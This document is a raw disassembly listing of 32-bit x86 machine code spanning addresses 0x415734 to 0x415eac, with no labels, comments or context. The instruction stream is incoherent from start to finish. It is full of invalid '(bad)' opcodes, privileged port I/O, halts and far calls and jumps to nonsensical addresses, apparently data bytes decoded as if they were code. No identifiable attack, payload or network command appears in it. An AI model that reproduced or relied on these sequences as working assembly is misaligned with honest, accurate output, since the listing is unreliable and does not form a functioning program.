  415734:	in     eax,dx
  415735:	pop    esi
  415736:	mov    eax,ds:0xba07e84b
  41573b:	jl     0x415756
  41573d:	lods   eax,DWORD PTR ds:[esi]
  41573e:	shl    DWORD PTR [edi],1
  415740:	(bad)  
  415741:	dec    ecx
  415742:	ss push 0x41a8c048
  415748:	adc    al,BYTE PTR [edi-0x22]
  41574b:	arpl   WORD PTR [edx],dx
  41574d:	fld    TBYTE PTR [esi]
  41574f:	ret    0x1236
  415752:	lds    ecx,FWORD PTR [eax*4+0x3baf17]
  415759:	ror    BYTE PTR [ecx-0x5e],cl
  41575c:	or     al,0x63
  41575e:	xchg   esp,eax
  41575f:	in     al,dx
  415760:	mov    dh,0xc7
  415762:	inc    eax
  415763:	rcl    DWORD PTR [edi-0x37],1
  415766:	jg     0x415787
  415768:	add    esp,edx
  41576a:	dec    DWORD PTR [esi]
  41576c:	daa    
  41576d:	jecxz  0x415778
  41576f:	lods   eax,DWORD PTR ds:[esi]
  415770:	pop    ebp
  415771:	arpl   WORD PTR [edi],cx
  415773:	(bad)  
  415774:	iret   
  415775:	push   esp
  415776:	out    dx,al
  415777:	push   edi
  415778:	cmp    eax,0x7ece165b
  41577d:	mov    gs,esi
  41577f:	xor    dh,0x9d
  415782:	jl     0x415762
  415784:	sti    
  415785:	add    dl,BYTE PTR [ecx]
  415787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415788:	and    cl,BYTE PTR [ebx+eax*2+0x7768489]
  41578f:	mov    ds:0xb5d6147f,al
  415794:	mov    esi,0xb4a7bcd8
  415799:	inc    eax
  41579a:	xchg   ebx,eax
  41579b:	inc    ebp
  41579c:	cmp    esi,DWORD PTR [esi]
  41579e:	push   ebx
  41579f:	shr    DWORD PTR [esi+0x6c],1
  4157a2:	ss stos DWORD PTR es:[edi],eax
  4157a4:	leave  
  4157a5:	push   ebx
  4157a6:	scas   eax,DWORD PTR es:[edi]
  4157a7:	stos   DWORD PTR es:[edi],eax
  4157a8:	iret   
  4157a9:	retf   0xfa8
  4157ac:	enter  0x7a60,0x5a
  4157b0:	mov    eax,esi
  4157b2:	sub    ebp,ebp
  4157b4:	repnz ds hlt 
  4157b7:	aad    0x9c
  4157b9:	xchg   ecx,eax
  4157ba:	loope  0x4157d2
  4157bc:	retf   0x6bf3
  4157bf:	cli    
  4157c0:	mov    DWORD PTR [ebx],edx
  4157c2:	ret    0xf11b
  4157c5:	das    
  4157c6:	fs in  eax,dx
  4157c8:	xchg   DWORD PTR [esi-0x6cf7c476],ebx
  4157ce:	push   esp
  4157cf:	ds gs push 0xaddc189
  4157d6:	mov    ch,0x2d
  4157d8:	pop    ebx
  4157d9:	pop    edx
  4157da:	or     DWORD PTR [ebx-0x4a],ecx
  4157dd:	(bad)  
  4157de:	pop    ebx
  4157df:	mov    BYTE PTR [edi+eax*8+0x5b9783d5],bl
  4157e6:	sub    BYTE PTR [esi],ch
  4157e8:	daa    
  4157e9:	pusha  
  4157ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157eb:	retf   0xc056
  4157ee:	inc    esi
  4157ef:	sbb    eax,0xe9a064bc
  4157f4:	jg     0x4157a7
  4157f6:	xchg   edx,eax
  4157f7:	mov    edi,0xfb626c12
  4157fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157fd:	cmp    BYTE PTR [eax],ch
  4157ff:	cmc    
  415800:	ror    DWORD PTR [edx+0x21],0xd3
  415804:	inc    ebp
  415805:	aas    
  415806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415807:	or     DWORD PTR [esi],edi
  415809:	pop    ebp
  41580a:	lods   eax,DWORD PTR ds:[esi]
  41580b:	add    eax,0x530234f2
  415810:	mov    DWORD PTR [edx-0x4202eefc],edi
  415816:	adc    BYTE PTR es:[edx+0x1fbbe8fb],0xe5
  41581e:	mul    DWORD PTR [eax-0x2f]
  415821:	sbb    DWORD PTR [esi-0x478791be],eax
  415827:	(bad)  
  415828:	xchg   esi,eax
  415829:	cli    
  41582a:	test   DWORD PTR [ecx-0x25],ecx
  41582d:	cmc    
  41582e:	int    0xa5
  415830:	pop    ebx
  415831:	push   ss
  415832:	loopne 0x415844
  415834:	ds dec esi
  415836:	sahf   
  415837:	xor    DWORD PTR [ecx+ebx*4-0x2dc7d5b6],ebx
  41583e:	dec    edx
  41583f:	mov    BYTE PTR [esp+ebp*4+0x65],dh
  415843:	xor    BYTE PTR [edi],ah
  415845:	dec    edi
  415846:	xlat   BYTE PTR ds:[ebx]
  415847:	mov    ch,0x31
  415849:	dec    ebx
  41584a:	fldenv [ebp+esi*8+0x1c]
  41584e:	mov    bl,0xc8
  415850:	(bad)
  415854:	xchg   esi,eax
  415855:	cmp    esi,DWORD PTR [ebp-0x52]
  415858:	in     eax,0x1c
  41585a:	push   es
  41585b:	imul   ebx,DWORD PTR [edx],0x0
  41585e:	(bad)  
  41585f:	jne    0x4158cf
  415861:	sbb    WORD PTR [edx-0x8889caa],di
  415868:	sbb    cl,BYTE PTR [edi+0x2e]
  41586b:	in     al,0xcc
  41586d:	inc    BYTE PTR ds:0x1b10bf54
  415873:	pop    edx
  415874:	pop    esp
  415875:	into   
  415876:	sbb    BYTE PTR [edx-0x7a],cl
  415879:	(bad)  [eax-0x71]
  41587c:	in     al,0xc8
  41587e:	popf   
  41587f:	xchg   DWORD PTR [esi],ebx
  415881:	mov    bh,0x75
  415883:	dec    ecx
  415884:	mov    esi,0x1f01f70b
  415889:	cmp    dl,BYTE PTR [ebp+0x746ad55a]
  41588f:	adc    eax,0xdfa52212
  415894:	js     0x4158d1
  415896:	push   edi
  415897:	(bad)  
  415898:	std    
  415899:	push   0xe7182dea
  41589e:	dec    ebp
  41589f:	jae    0x415884
  4158a1:	psrad  mm5,mm1
  4158a4:	shl    BYTE PTR [edx-0x9f1c903],0x68
  4158ab:	fidivr WORD PTR [edi-0x69]
  4158ae:	mov    al,ds:0x1072a4f5
  4158b3:	push   edx
  4158b4:	int3   
  4158b5:	and    ch,BYTE PTR [ecx-0x30]
  4158b8:	push   ss
  4158b9:	cmp    eax,DWORD PTR [esi+0x783ad20e]
  4158bf:	xchg   esi,eax
  4158c0:	jecxz  0x41587f
  4158c2:	out    0xdb,al
  4158c4:	sub    esp,DWORD PTR [eax]
  4158c6:	imul   ebx,esi,0x6de7347a
  4158cc:	add    edi,esi
  4158ce:	jbe    0x41591d
  4158d0:	jns    0x415931
  4158d2:	stos   DWORD PTR es:[edi],eax
  4158d3:	add    al,0x48
  4158d5:	nop
  4158d6:	adc    al,0x18
  4158d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158d9:	and    DWORD PTR [ebx+0x65],edx
  4158dc:	sar    eax,0x9e
  4158df:	push   es
  4158e0:	in     eax,dx
  4158e1:	int3   
  4158e2:	xor    eax,0x26a0ed4c
  4158e7:	sbb    al,0x22
  4158e9:	(bad)  
  4158ea:	cwde   
  4158eb:	sar    DWORD PTR [esi],0x20
  4158ee:	mov    esp,0x80a4b41a
  4158f3:	push   0x56
  4158f5:	call   DWORD PTR [ecx*4+0x5d340ed]
  4158fc:	add    al,0x14
  4158fe:	push   0xffffffa7
  415900:	dec    esi
  415901:	das    
  415902:	mov    dl,0xfa
  415904:	xor    eax,0xa22f0447
  415909:	mov    ebx,DWORD PTR [esi]
  41590b:	inc    edx
  41590c:	mov    edi,0xa88d40bd
  415911:	mov    al,cl
  415913:	fimul  WORD PTR [eax-0x6d]
  415916:	lock push 0xca7bf557
  41591c:	mov    cl,0x39
  41591e:	adc    al,0x4a
  415920:	push   0x89874b10
  415925:	sub    DWORD PTR [esi-0xc2d0972],0x9e1ecfeb
  41592f:	cmp    al,0xb9
  415931:	cmp    eax,0x2dceca32
  415936:	push   esp
  415937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415938:	jo     0x4158ed
  41593a:	out    0xa2,al
  41593c:	xchg   esi,eax
  41593d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593e:	inc    eax
  41593f:	xchg   edx,eax
  415940:	xchg   edx,eax
  415941:	push   cs
  415942:	hlt    
  415943:	cld    
  415944:	retf   0x7f2e
  415947:	jne    0x415984
  415949:	and    al,BYTE PTR [esi+eiz*2-0x6813cd6f]
  415950:	jmp    0x415949
  415952:	adc    edi,DWORD PTR [ebx+0xd]
  415955:	cmc    
  415956:	iret   
  415957:	adc    ecx,edx
  415959:	out    dx,eax
  41595a:	sbb    bh,BYTE PTR [esi-0x7ddd1b6]
  415960:	adc    bl,cl
  415962:	in     eax,dx
  415963:	in     eax,0x30
  415965:	push   0xffffffc4
  415967:	dec    esi
  415968:	popa   
  415969:	test   DWORD PTR [ebx-0x434ef81b],ecx
  41596f:	dec    esp
  415970:	pop    ebx
  415971:	loop   0x4159da
  415973:	adc    al,0x7c
  415975:	push   ecx
  415976:	hlt    
  415977:	xor    al,ah
  415979:	dec    esp
  41597a:	xchg   ecx,eax
  41597b:	inc    ebp
  41597c:	cmp    eax,0xa1818da8
  415981:	call   0x41a9:0x95b60bb2
  415988:	repnz out dx,eax
  41598a:	mov    ds:0x43f86f64,eax
  41598f:	sbb    DWORD PTR [esi-0xc5d869b],eax
  415995:	dec    edi
  415996:	les    esp,FWORD PTR [ecx+0x4c]
  415999:	mov    ds:0x7299d0cd,al
  41599e:	repz cli 
  4159a0:	(bad)  
  4159a1:	xchg   ecx,eax
  4159a2:	mov    ch,BYTE PTR [ecx]
  4159a4:	shl    BYTE PTR [esi+0x7ad62602],0x9e
  4159ab:	popa   
  4159ac:	mov    WORD PTR [esi-0x41dcb3ae],cs
  4159b2:	mov    esp,0xde52e3ac
  4159b7:	dec    ebx
  4159b8:	in     eax,dx
  4159b9:	dec    esi
  4159ba:	call   0x200:0xffdec440
  4159c1:	jbe    0x415998
  4159c3:	ss daa 
  4159c5:	test   DWORD PTR [ecx+0x69cf6a09],eax
  4159cb:	add    DWORD PTR [edi-0xd],ebx
  4159ce:	bound  ecx,QWORD PTR [edi+0x72]
  4159d1:	sar    DWORD PTR [eax+0x1d],0x59
  4159d5:	adc    al,al
  4159d7:	cmp    esp,ecx
  4159d9:	mov    bl,0xb3
  4159db:	out    dx,al
  4159dc:	cmc    
  4159dd:	pusha  
  4159de:	lahf   
  4159df:	jmp    0xa34f:0xe8fb411b
  4159e6:	mov    ebp,0x5db26685
  4159eb:	pop    ecx
  4159ec:	add    al,0xb
  4159ee:	cmp    eax,0x5b256143
  4159f3:	sub    eax,0x327d0222
  4159f8:	int3   
  4159f9:	adc    cl,al
  4159fb:	sub    edx,DWORD PTR [esp+esi*8-0x44ed76cc]
  415a02:	sbb    cl,BYTE PTR [ebp-0x77d9d018]
  415a08:	int3   
  415a09:	(bad)  
  415a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a0b:	add    edi,0xfffffff6
  415a0e:	mov    ds:0x21a0f04a,eax
  415a13:	scas   al,BYTE PTR es:[edi]
  415a14:	jge    0x415a52
  415a16:	pop    ds
  415a17:	cmp    bh,BYTE PTR [ecx-0x6904adb5]
  415a1d:	lods   eax,DWORD PTR ds:[esi]
  415a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a1f:	fs xor al,0xda
  415a22:	adc    eax,0x5fa6ff26
  415a27:	add    esi,edx
  415a29:	xor    DWORD PTR [ebp-0x31509f3a],ebp
  415a2f:	or     al,BYTE PTR ds:0x43bfed42
  415a35:	enter  0x1f5b,0xae
  415a39:	push   es
  415a3a:	push   cs
  415a3b:	std    
  415a3c:	xlat   BYTE PTR ds:[ebx]
  415a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a3e:	sbb    BYTE PTR [edx-0x37],0x7d
  415a42:	and    ch,BYTE PTR [edx+esi*4+0x4c525831]
  415a49:	and    BYTE PTR [ebp-0x47],dh
  415a4c:	cmc    
  415a4d:	sahf   
  415a4e:	push   ss
  415a4f:	mov    ?,WORD PTR [ebp-0x4358926c]
  415a55:	pop    esi
  415a56:	popf   
  415a57:	jns    0x415a46
  415a59:	iret   
  415a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a5b:	scas   eax,DWORD PTR es:[edi]
  415a5c:	inc    ecx
  415a5d:	int3   
  415a5e:	push   ds
  415a5f:	stos   BYTE PTR es:[edi],al
  415a60:	cmc    
  415a61:	dec    ebp
  415a62:	ins    BYTE PTR es:[edi],dx
  415a63:	adc    BYTE PTR [edi-0x1d],cl
  415a66:	push   ds
  415a67:	sbb    ecx,edi
  415a69:	ss mov ch,0x75
  415a6c:	pop    ebx
  415a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a6e:	mov    WORD PTR [ebp+edx*8-0x17],gs
  415a72:	neg    esp
  415a74:	pop    esp
  415a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a76:	pop    ss
  415a77:	in     al,dx
  415a78:	(bad)  [ecx-0x6a]
  415a7b:	pop    edx
  415a7c:	pushf  
  415a7d:	test   eax,0xaee353bc
  415a82:	adc    BYTE PTR [edx-0x7a],dh
  415a85:	loop   0x415af5
  415a87:	lods   eax,DWORD PTR ds:[esi]
  415a88:	or     BYTE PTR [eax+eiz*8-0x56],ah
  415a8c:	or     al,0x2
  415a8e:	adc    DWORD PTR [edx+edi*1-0x4f],eax
  415a92:	call   DWORD PTR [edi]
  415a94:	js     0x415b02
  415a96:	adc    eax,DWORD PTR [esi+0x46]
  415a99:	stos   BYTE PTR es:[edi],al
  415a9a:	stos   DWORD PTR es:[edi],eax
  415a9b:	loop   0x415b03
  415a9d:	and    al,0x4e
  415a9f:	ja     0x415b1f
  415aa1:	pusha  
  415aa2:	mov    ?,WORD PTR [edi-0x41]
  415aa5:	dec    eax
  415aa6:	pop    eax
  415aa7:	dec    edx
  415aa8:	sbb    ah,dl
  415aaa:	arpl   WORD PTR [edx+0x3d],cx
  415aad:	jle    0x415ab1
  415aaf:	lahf   
  415ab0:	cmp    eax,0x16b4c48d
  415ab5:	jb     0x415af1
  415ab7:	aaa    
  415ab8:	(bad)  
  415ab9:	shr    BYTE PTR [eax],cl
  415abb:	push   eax
  415abc:	xlat   BYTE PTR ds:[ebx]
  415abd:	and    BYTE PTR [eax+esi*8],cl
  415ac0:	fild   WORD PTR [ecx-0x14]
  415ac3:	cmp    esi,DWORD PTR [ebx+ecx*1]
  415ac6:	mov    ds:0x75f11123,eax
  415acb:	sbb    al,0x2
  415acd:	je     0x415ad4
  415acf:	jo     0x415b11
  415ad1:	in     al,0x2d
  415ad3:	imul   ecx
  415ad5:	inc    esp
  415ad6:	xchg   edi,eax
  415ad7:	mov    cl,0x7f
  415ad9:	cmp    DWORD PTR [ebx-0x30],0x3a
  415add:	or     BYTE PTR [edx],ch
  415adf:	xor    eax,DWORD PTR [edi+0x25c82647]
  415ae5:	mov    esp,0xb3fb2260
  415aea:	mul    BYTE PTR [ecx+0x4156704a]
  415af0:	pop    edx
  415af1:	std    
  415af2:	pop    edi
  415af3:	pslld  mm6,mm3
  415af6:	test   DWORD PTR [ebx+0x32337fc8],ebx
  415afc:	ret    
  415afd:	pop    esp
  415afe:	jmp    0x5cb9dbfc
  415b03:	cdq    
  415b04:	xchg   ebp,eax
  415b05:	out    dx,al
  415b06:	dec    ebp
  415b07:	and    al,0x65
  415b09:	sub    DWORD PTR [ebx],esi
  415b0b:	cdq    
  415b0c:	(bad)  
  415b0d:	mov    ebp,0xdab5aa18
  415b12:	lock sub BYTE PTR [eax-0x1a],dh
  415b16:	imul   esi,DWORD PTR [edi+0x4a],0x77
  415b1a:	mov    ebx,0xea247766
  415b1f:	test   eax,0x50e72ae8
  415b24:	sub    eax,0xd1c4aab9
  415b29:	pop    esp
  415b2a:	imul   esp,DWORD PTR [eax],0x2c
  415b2d:	loop   0x415b8f
  415b2f:	mov    ds:0x66561d80,eax
  415b34:	jns    0x415b59
  415b36:	sub    BYTE PTR [esi],al
  415b38:	cwde   
  415b39:	cmp    al,0x4d
  415b3b:	imul   ebx,edi,0x6cd070a4
  415b41:	cmp    al,0xff
  415b43:	sub    DWORD PTR [edi+0x32437089],edx
  415b49:	and    al,0x8
  415b4b:	test   BYTE PTR [edx+0x390f9385],dh
  415b51:	ja     0x415b80
  415b53:	add    eax,0x12984771
  415b58:	pop    ecx
  415b59:	add    al,0x29
  415b5b:	ret    0x7729
  415b5e:	not    DWORD PTR [eax]
  415b60:	shl    DWORD PTR [ecx+0x4c0bd579],0xdf
  415b67:	loope  0x415bbf
  415b69:	cld    
  415b6a:	jle    0x415b73
  415b6c:	mov    esp,DWORD PTR [eax+eax*1]
  415b6f:	shr    BYTE PTR [edx],1
  415b71:	mov    edi,ebx
  415b73:	fild   WORD PTR [ebx-0x59eb20e4]
  415b79:	xchg   ecx,eax
  415b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b7c:	push   ds
  415b7d:	jno    0x415b97
  415b7f:	ret    
  415b80:	int    0x15
  415b82:	push   esi
  415b83:	leave  
  415b84:	stos   DWORD PTR es:[edi],eax
  415b85:	sub    eax,0x5e07839f
  415b8a:	movd   DWORD PTR [edi],mm7
  415b8d:	aam    0xcd
  415b8f:	popa   
  415b90:	sbb    BYTE PTR [ecx+0x17],dl
  415b93:	leave  
  415b94:	mov    dh,0xb5
  415b96:	pop    esp
  415b97:	ins    DWORD PTR es:[edi],dx
  415b98:	cmp    DWORD PTR [ebx+eax*1],eax
  415b9b:	mov    edi,0x1bb25c49
  415ba0:	les    edx,FWORD PTR [eax+0x33]
  415ba3:	lods   eax,DWORD PTR ds:[esi]
  415ba4:	outs   dx,BYTE PTR ds:[esi]
  415ba5:	inc    ebx
  415ba6:	retf   
  415ba7:	js     0x415bba
  415ba9:	mov    bl,0xfb
  415bab:	test   DWORD PTR [ebp-0x29dae6fa],ebp
  415bb1:	sub    eax,0x3d0b7f92
  415bb6:	sbb    ebp,DWORD PTR [edx-0x19c96dca]
  415bbc:	ret    
  415bbd:	imul   ebx,edi,0xc
  415bc0:	in     al,dx
  415bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bc2:	test   eax,0x427af671
  415bc7:	(bad)  
  415bc8:	mov    ecx,0xa68392d4
  415bcd:	(bad)  
  415bce:	jae    0x415b87
  415bd0:	clc    
  415bd1:	mov    ah,0x7b
  415bd3:	pusha  
  415bd4:	cmp    eax,0xd0e86a4e
  415bd9:	ds jg  0x415b81
  415bdc:	push   eax
  415bdd:	inc    esp
  415bde:	daa    
  415bdf:	shl    ecx,cl
  415be1:	inc    esp
  415be2:	retf   
  415be3:	enter  0xfdd2,0x1
  415be7:	xchg   ebx,eax
  415be8:	icebp  
  415be9:	mov    bh,ch
  415beb:	inc    ecx
  415bec:	repnz add bh,BYTE PTR [esi]
  415bef:	pop    esi
  415bf0:	push   esi
  415bf1:	stc    
  415bf2:	lds    esi,FWORD PTR [eax+0x6f]
  415bf5:	out    dx,eax
  415bf6:	in     al,0x5c
  415bf8:	loopne 0x415c38
  415bfa:	or     bh,0xfb
  415bfd:	sub    al,0x49
  415bff:	leave  
  415c00:	sar    BYTE PTR [edi+0x58772029],0xc2
  415c07:	inc    edx
  415c08:	shr    BYTE PTR [ebx],1
  415c0a:	xlat   BYTE PTR ds:[ebx]
  415c0b:	lods   al,BYTE PTR ds:[esi]
  415c0c:	stos   BYTE PTR es:[edi],al
  415c0d:	inc    edx
  415c0e:	loopne 0x415c69
  415c10:	in     eax,dx
  415c11:	xchg   ecx,eax
  415c12:	or     al,0x7
  415c14:	jmp    0x415be5
  415c16:	mov    eax,es
  415c18:	fsub   QWORD PTR [ebx+0x9]
  415c1b:	in     eax,0xaf
  415c1d:	pop    esi
  415c1e:	imul   esp,esi,0xffffffae
  415c21:	xor    al,0xc3
  415c23:	pushf  
  415c24:	add    BYTE PTR [ecx+eax*2],ch
  415c27:	jge    0x415ca1
  415c29:	pop    ebx
  415c2a:	cmp    eax,0x4e51e629
  415c2f:	mov    bh,BYTE PTR [edi]
  415c31:	call   0x334a:0x65cb2a86
  415c38:	repz cmp ebp,edi
  415c3b:	and    ch,BYTE PTR [ecx-0x37e1e33e]
  415c41:	xor    al,0x93
  415c43:	jl     0x415be7
  415c45:	retf   0x1d77
  415c48:	dec    ebx
  415c49:	pop    eax
  415c4a:	sar    BYTE PTR [ebx+0xbb9fc06],1
  415c50:	mov    ds:0xce3829c,al
  415c55:	mov    cl,0x21
  415c57:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  415c59:	pop    ebp
  415c5a:	out    0x66,eax
  415c5c:	lea    ecx,[eax]
  415c5e:	fdivr  DWORD PTR [eax+0x1]
  415c61:	push   ss
  415c62:	repz imul DWORD PTR [ebx+ebx*4-0x39af34f7]
  415c6a:	sub    bl,BYTE PTR [eax]
  415c6c:	sahf   
  415c6d:	out    0x83,eax
  415c6f:	ror    DWORD PTR [eax+ecx*1+0x3a],cl
  415c73:	sbb    al,BYTE PTR [ebp-0x5834089d]
  415c79:	xchg   ebx,eax
  415c7a:	loop   0x415c6d
  415c7c:	mov    ebp,0x2c523b82
  415c81:	daa    
  415c82:	repnz push edi
  415c84:	in     eax,dx
  415c85:	repnz lds edx,FWORD PTR [eax+0x6f]
  415c89:	mov    al,ds:0x85391b1
  415c8e:	stc    
  415c8f:	dec    edi
  415c90:	inc    ebx
  415c91:	loope  0x415cc1
  415c93:	(bad)  
  415c94:	mov    ch,0x37
  415c96:	call   0x34ac:0x7c37f210
  415c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c9e:	adc    DWORD PTR [eax-0x64],ecx
  415ca1:	ss jnp 0x415cd1
  415ca4:	ins    BYTE PTR es:[edi],dx
  415ca5:	loope  0x415c88
  415ca7:	in     al,0x60
  415ca9:	sbb    eax,DWORD PTR [esi-0x77]
  415cac:	and    BYTE PTR [ebx+edi*4-0x59],bl
  415cb0:	repz adc al,0x1c
  415cb3:	jb     0x415ca5
  415cb5:	ss mov dl,0xfc
  415cb8:	pop    esp
  415cb9:	aaa    
  415cba:	imul   ebp,DWORD PTR [esi-0x43],0xffffff90
  415cbe:	inc    ecx
  415cbf:	push   ebx
  415cc0:	cli    
  415cc1:	push   es
  415cc2:	mov    ds:0x2b9da3d7,eax
  415cc7:	fs sbb al,0x74
  415cca:	push   esp
  415ccb:	mov    al,ds:0x1dcfdf71
  415cd0:	pop    ebp
  415cd1:	add    BYTE PTR [eax],0x67
  415cd4:	inc    ebx
  415cd5:	dec    ecx
  415cd6:	mov    ebp,0xa2123523
  415cdb:	mov    al,ds:0x22c80a76
  415ce0:	pop    ebx
  415ce1:	inc    edi
  415ce2:	pop    es
  415ce3:	sbb    al,0x72
  415ce5:	(bad)  
  415ce6:	jle    0x415c77
  415ce8:	ja     0x415c8a
  415cea:	sub    ch,bh
  415cec:	mov    dl,0x13
  415cee:	pop    ebx
  415cef:	pop    ecx
  415cf0:	icebp  
  415cf1:	sub    ebp,ebx
  415cf3:	add    ecx,esp
  415cf5:	int3   
  415cf6:	xchg   BYTE PTR [edx],cl
  415cf8:	push   0xffffffb9
  415cfa:	in     eax,dx
  415cfb:	push   edi
  415cfc:	push   ebx
  415cfd:	mov    DWORD PTR [ebx],eax
  415cff:	lds    edx,FWORD PTR [ebp+0x74]
  415d02:	jae    0x415cb9
  415d04:	push   ss
  415d05:	xchg   eax,edi
  415d07:	inc    esi
  415d08:	sbb    eax,0xf674032c
  415d0d:	mov    edi,0xcffe654c
  415d12:	loopne 0x415d90
  415d14:	cmp    eax,0xcd4924b
  415d19:	es jns 0x415ccb
  415d1c:	add    eax,0x9dfed120
  415d21:	inc    ebx
  415d22:	call   0xdfb2:0x8ef5686f
  415d29:	dec    esp
  415d2a:	mov    esp,eax
  415d2c:	call   0x4141d626
  415d31:	pop    esp
  415d32:	pop    ss
  415d33:	shr    DWORD PTR [ebp+0x42],1
  415d36:	sub    BYTE PTR [esi],dl
  415d38:	mov    esi,0x5288c1f1
  415d3d:	inc    ecx
  415d3e:	adc    eax,0x74bfcf68
  415d43:	jne    0x415d7a
  415d45:	mov    ebx,0xa510854d
  415d4a:	xor    al,0x5b
  415d4c:	lods   al,BYTE PTR ds:[esi]
  415d4d:	mov    eax,0x4e62ebac
  415d52:	cld    
  415d53:	push   edi
  415d54:	add    eax,0xd47f8ccf
  415d59:	aam    0xa2
  415d5b:	sar    BYTE PTR [ecx-0x159e9405],1
  415d61:	shl    esi,1
  415d63:	(bad)  
  415d64:	mov    ch,0x6a
  415d66:	(bad)
  415d6a:	arpl   WORD PTR [eax-0x1f],bx
  415d6d:	mov    ch,0x44
  415d6f:	lods   al,BYTE PTR ds:[esi]
  415d70:	cmp    eax,0x64e16c06
  415d75:	jle    0x415d46
  415d77:	shr    ebx,0x46
  415d7a:	mov    esp,edi
  415d7c:	jmp    0x475c3a4b
  415d81:	je     0x415dcd
  415d83:	test   DWORD PTR [ebp-0x18],0x9352f80d
  415d8a:	loope  0x415dc6
  415d8c:	mov    WORD PTR [ebx],es
  415d8e:	pusha  
  415d8f:	or     DWORD PTR [esi+edi*2],edx
  415d92:	inc    ebx
  415d93:	repz test DWORD PTR [esi],esp
  415d96:	jno    0x415db7
  415d98:	xor    eax,0xae0eb103
  415d9d:	aaa    
  415d9e:	jae    0x415d7f
  415da0:	loop   0x415d4c
  415da2:	shl    BYTE PTR [ebx+0x507f6d6a],1
  415da8:	mov    ch,0x40
  415daa:	cmp    DWORD PTR [ebp+0xea9d2c0],eax
  415db0:	jl     0x415d83
  415db2:	inc    ebp
  415db3:	fisttp WORD PTR [edx-0x2eec7894]
  415db9:	scas   eax,DWORD PTR es:[edi]
  415dba:	mov    dl,0x21
  415dbc:	dec    eax
  415dbd:	mov    ecx,0xffe25a75
  415dc2:	stos   DWORD PTR es:[edi],eax
  415dc3:	call   0x70f0c27f
  415dc8:	push   ss
  415dc9:	and    BYTE PTR [edi],ah
  415dcb:	push   edx
  415dcc:	or     BYTE PTR [esi+ecx*1+0x6c],ch
  415dd0:	fmul   QWORD PTR [eax]
  415dd2:	push   cs
  415dd3:	jg     0x415df4
  415dd5:	jb     0x415e4e
  415dd7:	xchg   ebx,eax
  415dd8:	add    eax,0x3b3dba2b
  415ddd:	pop    esp
  415dde:	adc    esi,DWORD PTR [edi]
  415de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de1:	aaa    
  415de2:	aaa    
  415de3:	(bad)  
  415de4:	xor    dl,ch
  415de6:	sub    eax,0x60f9d569
  415deb:	push   cs
  415dec:	shr    dh,0x64
  415def:	jo     0x415e36
  415df1:	adc    eax,0x9ecbef80
  415df6:	bswap  edi
  415df8:	or     eax,eax
  415dfa:	sbb    edi,DWORD PTR [edi+0x79d3a469]
  415e00:	mov    ebp,0xefa4deeb
  415e05:	inc    eax
  415e06:	jp     0x415e80
  415e08:	sub    ah,BYTE PTR [edi+0x44]
  415e0b:	push   ecx
  415e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e0d:	lock xlat BYTE PTR ds:[ebx]
  415e0f:	jne    0x415e20
  415e11:	xor    DWORD PTR [ecx+0x44],edi
  415e14:	add    al,0x5
  415e16:	or     ch,bh
  415e18:	sbb    edx,DWORD PTR [esi+0x5c88b14a]
  415e1e:	not    DWORD PTR [ebp-0x66f75a4]
  415e24:	pop    ecx
  415e25:	popf   
  415e26:	addr16 gs cdq 
  415e29:	test   al,0x8b
  415e2b:	in     eax,dx
  415e2c:	outs   dx,DWORD PTR ds:[esi]
  415e2d:	repz test eax,0x2747ddc2
  415e33:	scas   al,BYTE PTR es:[edi]
  415e34:	add    eax,0x5f869a94
  415e39:	cmc    
  415e3a:	push   0xffffffb7
  415e3c:	jge    0x415e0c
  415e3e:	add    bh,BYTE PTR [ebx-0x7f5c0fb5]
  415e44:	dec    ebp
  415e45:	aaa    
  415e46:	enter  0x72b6,0x2d
  415e4a:	retf   0x61d7
  415e4d:	dec    ebp
  415e4e:	add    eax,ebp
  415e50:	inc    ebp
  415e51:	add    dl,BYTE PTR [eax-0x5969f939]
  415e57:	adc    DWORD PTR gs:[ecx-0xa],ebp
  415e5b:	sti    
  415e5c:	mov    bh,0xc5
  415e5e:	data16 aaa 
  415e60:	jmp    0x3c4ddd39
  415e65:	mov    ds:0x8c8a3993,eax
  415e6a:	sbb    dh,dl
  415e6c:	inc    ebp
  415e6d:	mov    ebx,0x37365705
  415e72:	test   DWORD PTR [eax],edi
  415e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e75:	xor    dh,al
  415e77:	sbb    ebx,eax
  415e79:	jmp    0xb98db2e1
  415e7e:	jb     0x415ee5
  415e80:	jb     0x415ed8
  415e82:	dec    esp
  415e83:	mov    ?,WORD PTR [edi]
  415e85:	xlat   BYTE PTR ds:[ebx]
  415e86:	push   ds
  415e87:	out    dx,al
  415e88:	cmp    ch,cl
  415e8a:	das    
  415e8b:	leave  
  415e8c:	xchg   BYTE PTR [edi-0x3b],bl
  415e8f:	mov    ah,0xf4
  415e91:	add    DWORD PTR [ecx-0x40],edx
  415e94:	shl    BYTE PTR [edi+0x694eb0e9],1
  415e9a:	ror    DWORD PTR [esi],0xbc
  415e9d:	ret    0x9008
  415ea0:	cmp    dh,BYTE PTR [eax-0x105913f3]
  415ea6:	lods   eax,DWORD PTR ds:[esi]
  415ea7:	xlat   BYTE PTR ds:[ebx]
  415ea8:	fsubr  DWORD PTR [edx]
  415eaa:	cli    
  415eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eac:	push   cs
